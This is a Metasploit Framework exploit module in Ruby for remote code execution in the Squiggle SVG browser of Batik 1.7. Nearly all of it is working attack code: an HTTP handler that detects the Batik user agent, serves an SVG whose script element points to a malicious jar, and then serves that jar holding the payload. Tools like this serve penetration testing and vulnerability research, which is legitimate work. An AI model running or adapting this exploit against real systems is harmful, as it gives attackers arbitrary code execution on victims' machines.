##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "Squiggle 1.7 SVG Browser Java Code Execution",
			'Description'    => %q{
					This module abuses the SVG support to execute Java Code in the
				Squiggle Browser included in the Batik framework 1.7 through a
				crafted svg file referencing a jar file.

				In order to gain arbitrary code execution, the browser must meet
				the following conditions: (1) It must support at least SVG version
				1.1 or newer, (2) It must support Java code and (3) The "Enforce
				secure scripting" check must be disabled.

				The module has been tested against Windows and Linux platforms.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Nicolas Gregoire', # aka @Agarri_FR, Abuse discovery and PoC
					'sinn3r',           # Metasploit
					'juan vazquez'      # Metasploit
				],
			'References'     =>
				[
					['URL', 'http://www.agarri.fr/blog/']
				],
			'Payload'       =>
				{
					'Space' => 20480,
					'BadChars' => '',
					'DisableNops' => true
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => ['win', 'linux', 'java'],
			'Targets'        =>
				[
					[ 'Generic (Java Payload)',
						{
							'Arch' => ARCH_JAVA,
						}
					],
					[ 'Windows Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						}
					],
					[ 'Linux x86',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => "May 11 2012",
			'DefaultTarget'  => 0))

	end

	def on_request_uri(cli, request)

		agent = request.headers['User-Agent']
		jar_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
		jar_uri << "/#{rand_text_alpha(rand(6)+3)}.jar"
		rand_text = Rex::Text.rand_text_alphanumeric(rand(8)+4)

		if request.uri =~ /\.jar$/
			paths = [
				[ "Exploit.class" ],
				[ "Exploit$1.class"],
				[ "META-INF", "MANIFEST.MF"]
			]

			p = regenerate_payload(cli)

			jar  = p.encoded_jar
			paths.each do |path|
				1.upto(path.length - 1) do |idx|
					full = path[0,idx].join("/") + "/"
					if !(jar.entries.map{|e|e.name}.include?(full))
						jar.add_file(full, '')
					end
				end

				fd = File.open(File.join( Msf::Config.install_root, "data", "exploits", "batik_svg", path ), "rb")
				data = fd.read(fd.stat.size)
				jar.add_file(path.join("/"), data)
				fd.close
			end

			print_status("Sending jar payload")
			send_response(cli, jar.pack, {'Content-Type'=>'application/java-archive'})

		elsif agent =~ /Batik/
			svg = %Q|
			<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0">
			<script type="application/java-archive" xlink:href="#{jar_uri}"/>
			<text>#{rand_text}</text>
			</svg>
			|

			svg = svg.gsub(/\t\t\t/, '')
			print_status("Sending svg")
			send_response(cli, svg, {'Content-Type'=>'image/svg+xml'})

		else
			print_error("I don't know what the client is requesting: #{request.uri}")
		end
	end
end
